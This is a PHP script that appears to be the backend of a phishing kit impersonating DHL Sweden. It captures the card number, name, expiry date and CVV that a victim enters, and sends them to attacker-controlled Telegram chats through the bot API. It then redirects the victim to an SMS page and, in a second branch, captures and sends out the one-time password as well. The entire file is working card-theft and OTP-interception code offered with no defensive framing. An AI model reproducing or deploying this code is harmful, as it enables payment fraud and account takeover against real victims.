<?php 
session_start();
require '../config.php';

$ip = $_SERVER['REMOTE_ADDR'];



function send($link) {
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $link);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    return curl_exec($c);
    curl_close($c);
}


 


if(isset($_POST['ccnum'])){
 
$msg = urlencode("DHL SE cc / $ip

Name : ".$_POST['name']."
CC : ".str_replace(" ", "", $_POST['ccnum'])."
Exp : ".$_POST['exp']."
Cvv : ".$_POST['cvv']."

");
	
 foreach($chat_ids as $chat_id){
	send("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$msg");
}
		
	header("location: sms.php");
	
}




if(isset($_POST['otp'])){
	sleep($seconds);
$msg = urlencode("DHL SE otp / $ip

OTP: ".$_POST['otp']."

");

 foreach($chat_ids as $chat_id){
	send("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$msg");
}
	
	
}









?>